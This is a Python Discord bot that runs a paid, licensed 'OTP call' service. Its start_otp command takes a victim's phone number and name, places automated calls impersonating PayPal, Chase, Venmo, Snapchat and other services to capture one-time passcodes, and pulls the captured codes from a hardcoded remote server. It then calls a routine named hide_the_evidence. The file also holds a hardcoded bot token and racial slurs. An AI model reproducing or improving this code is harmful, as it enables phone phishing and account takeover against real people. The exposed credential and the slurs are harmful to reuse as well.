import discord
from discord.ext import tasks
from discord import app_commands
from datetime import datetime
import json
import asyncio
import time
import requests
from otp import OTP

admins = [1142591992082219019, 1141879592982941756]
blacklist = [976386554031374368]

TOKEN = "MTE0MTkxMTk1MDI1MTUzNjQ1NQ.GegLIF.TXe29B5jVBOihezwzH92J-ZU_Oc9QSY-0N6pAM"
intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)


def embed(txt: str, code: int = 69):
    if code == 0:
        return discord.Embed(description=f"<:yes:1132169616647536651> {txt}")
    elif code == 1:
        return discord.Embed(description=f"<:no:1132169617998098453> {txt}")
    else:
        return discord.Embed(description=txt)


whitelist = {}

@tasks.loop(seconds=30)
async def update_whitelist():
    global whitelist
    with open("whitelist.json") as f:
        whitelist = json.load(f)


def add_user_to_whitelist(user_id: str, expiration: int):
    whitelistt = whitelist
    try:
        previous_exp = whitelistt[str(user_id)]
        difference = int(time.time()) - previous_exp
        whitelistt[str(user_id)] = (
            difference + expiration if difference > 0 else expiration
        )  # Adds onto the already remaining time

    except:
        whitelistt[str(user_id)] = int(expiration)

    with open("whitelist.json", "w+") as jF:
        json.dump(whitelistt, jF, indent=4)
    return True


def check_userexpiration(userid: str, show_info: bool = False):
    try:
        if int(whitelist[userid]) <= int(time.time()):
            if show_info:
                return True, int(whitelist[userid])
            return True  # Expired
        else:
            if show_info:
                return False, int(whitelist[userid])
            return False  # Not Expired
    except Exception as e:
        # print(e)
        if show_info:
            return None, None
        return None  # Not created


@client.event
async def on_connect():
    await update_whitelist.start()
    
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="vast code me 🙊"))
    await tree.sync()
    print("Ready.")
    channel = client.get_channel(1141911818743328900)
    await channel.send("<@810904765684252715> ok its on nigger")


@tree.command(
    name="resync", description="Owner only"
)
async def resync(interaction: discord.Interaction):
    if interaction.user.id in admins:
        await tree.sync(guild=discord.Object(id=interaction.guild.id))
        await interaction.response.send_message("Commands re-synced for this guild.")
    else:
        await interaction.response.send_message(
            "You must be the owner to use this command!"
        )


@tree.command(name="check_license", description="OWNER ONLY | Check a users license.")
async def check_license(interaction: discord.Interaction, user_id: str):
    # await interaction.response.defer(thinking=True, ephemeral=True)
    res = check_userexpiration(user_id)
    embed = discord.Embed(
        description=f"<@{user_id}> License Status: {'<:yes:1132169616647536651>' if res == False else '<:no:1132169617998098453>'}"
    )
    await interaction.response.send_message(embed=embed)  # fixed


@tree.command(
    name="license_stats", description="Check when your license is due to expire"
)
async def license_stats(interaction: discord.Interaction):
    result, expiry = check_userexpiration(str(interaction.user.id), show_info=True)
    if result:
        return await interaction.response.send_message(
            f"```Your license expired on {datetime.fromtimestamp(float(expiry))}```",
            ephemeral=True,
        )
    elif result == False:
        return await interaction.response.send_message(
            f"```Your license will expire on {datetime.fromtimestamp(float(expiry))}```",
            ephemeral=True,
        )
    else:
        return await interaction.response.send_message(
            "```You have not purchased a license yet```", ephemeral=True
        )


@tree.command(
    name="add_subscription", description="OWNER ONLY | Adds Subscription to user"
)
@app_commands.choices(
    license_length=[
        app_commands.Choice(name="1 Day", value=86400),
        app_commands.Choice(name="1 Week", value=604800),
        app_commands.Choice(name="1 Month", value=2592000),
        app_commands.Choice(name="3 Months", value=7776000),
        app_commands.Choice(name="Lifetime", value=2132376721),
    ]
)
async def add_subscription(
    interaction: discord.Interaction,
    user_id: str,
    license_length: app_commands.Choice[int],
):
    if int(interaction.user.id) in admins:
        add_user_to_whitelist(
            str(interaction.user.id), int(time.time()) + int(license_length.value)
        )
        return await interaction.response.send_message(
            embed=embed(f"Successfully Added <@{user_id}> To Whitelist.", 0)
        )

    else:
        return await interaction.response.send_message("Insufficient Permissions")



@tree.command(name="start_otp", description="Starts an OTP call")
@app_commands.choices(
    service=[
        app_commands.Choice(name="Paypal", value=1),
        app_commands.Choice(name="DoorDash", value=2),
        app_commands.Choice(name="Venmo", value=3),
        app_commands.Choice(name="Snapchat", value=4),
        app_commands.Choice(name="Chase", value=5),
        app_commands.Choice(name="Twitter", value=6),
    ],
    private=[
        app_commands.Choice(name="True", value=1),
        app_commands.Choice(name="False", value=2)
    ]
)
@app_commands.describe(
    phone_number="Victims Phone Number. (including country code) (ex: +19542036398)",
    otp_length="Length of the OTP code",
    name="Victims name",
    service="Service you want to mimic a call for.",
    private="Show Other Users OTP Status"
)
@app_commands.checks.cooldown(1, 30)
async def start_otp(
    interaction: discord.Interaction,
    phone_number: str,
    otp_length: int,
    name: str,
    service: app_commands.Choice[int],
    private: app_commands.Choice[int]
):
    try:
        if interaction.user.id in blacklist:
            return await interaction.response.send_message("You are currently blacklisted. Contact me @imvast to request unblacklist.")
        await interaction.response.defer(thinking=True, ephemeral=(True if private.value == 1 else False))
        res = check_userexpiration(str(interaction.user.id))
        if res:
            return await interaction.followup.send(
                embed=embed(
                    "Your License has Expired please purchase a new one to continue using the bot :angry:", 1
                )
            )

        elif res == None:
            return await interaction.followup.send(
                embed=embed("Please purchase a key in order to use this bot! :angry:", 1)
            )

        if "nigger" in name.lower():
            return await interaction.followup.send(
                embed=embed("NO! fuck you nigger stop abusing our totp :angry:", 1)
            )

        if not phone_number.startswith("+"):
            return await interaction.followup.send(
                embed=embed("Please Include the Country Code in the phone number :man_facepalming:", 1)
            )
        elif len(phone_number) < 8:
            return await interaction.followup.send(
                embed=embed("You silly goose no way phone numbers are this short :man_facepalming:", 1)
            )
            
        if otp_length > 12 or otp_length <= 2:
            return await interaction.followup.send(
                embed=embed(
                    "You silly goose what OTP code isn't between 2-12 digits long :man_facepalming:", 1
                )
            )

        
        await interaction.followup.send(embed=embed("Calling phone... ", 0))
        
        new_call = OTP(
            phone_number,
            name,
            otp_length,
            service.name
        )
        callID = await new_call.make_call()

        statuses = {
            "started": "<:call:1134360428898701394> Call Started.",
            "ringing": "<a:load:1134360432283492394> Call Ringing...",
            "answered": ":heart_eyes_cat: Call Answered",
            "completed": ":fire: Call Completed",
            "busy": "<:busy:1134360433457905695> Victim is busy :angry:",
            "declined": ":frowning: Call Declined"
        }
        
        status_gen = new_call.get_status(callID)
        prior_status = ""
        async for status in status_gen:
            prior_status = prior_status + statuses.get(status) + "\n"
            await interaction.edit_original_response(embed=embed(f"Calling phone...\n\n<:log:1134360430127620257> `Status:`\n>>> {prior_status}", 0))

        res = requests.get("http://45.128.232.18:5000/dev/database?access=dev69").json()['active']
        
        await interaction.edit_original_response(
            embed=embed(
                f"""
                Calling phone...

                <:log:1134360430127620257> `Status:`
                >>> {prior_status}

                Code: `{res.get(new_call.ukey) if res.get(new_call.ukey) != '' else 'null'}`
                """, 0
            )
        )

        logchannel = client.get_channel(1141911818743328900)
        await logchannel.send(f"Call Complete. Stats:\n```{new_call.client.voice.get_call(callID.get('uuid'))}```\nCaller: {interaction.user.name} (`{interaction.user.id}`)")

        new_call.hide_the_evidence()
    except Exception as e:
        prior_status += "api timed out."
        await interaction.edit_original_response(
            embed=embed(
                f"""
                Calling phone...

                <:log:1134360430127620257> `Status:`
                >>> {prior_status}

                Code: `{res.get(new_call.ukey) if res.get(new_call.ukey) != '' else 'null'}`
                """, 0
            )
        )
        print(f"erxceptione: {e}")
        
            
    

@tree.command(
    name="blacklist", description="Add user to blacklist", guild=discord.Object(1132949866243428393)
)
async def blacklist_user(interaction: discord.Interaction, user_id: str):
    blacklist.append(user_id)
    return await interaction.response.send_message(f"<@{user_id}> added to the blacklist.")




async def error_handler(
    interaction: discord.Interaction, error: app_commands.AppCommandError
):
    try:
        await interaction.response.send_message(embed=embed(str(error), 1), ephemeral=True)
    except Exception as e:
        print(f"[failed to send msg] caught error: {error}  || excepto: {e}")



if __name__ == "__main__":
    client.on_error = error_handler
    tree.on_error = error_handler
    client.run(TOKEN)